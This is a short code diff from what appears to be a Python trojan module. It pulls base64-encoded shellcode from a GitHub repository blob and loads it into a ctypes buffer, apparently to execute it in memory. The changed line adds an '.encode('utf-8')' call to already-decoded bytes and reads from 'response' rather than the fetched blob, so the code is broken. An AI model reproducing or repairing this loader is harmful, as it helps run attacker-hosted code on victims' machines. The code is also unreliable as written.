@@ -11,7 +11,7 @@ def run(**args):
         return False
     repo = GitHub().repository(args['gituser'], args['reponame'])
     blobfile = repo.blob(args['scsha'])
-    shellcode = base64.b64decode(response.read())
+    shellcode = base64.b64decode(response.read()).encode('utf-8')
     
     shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
     
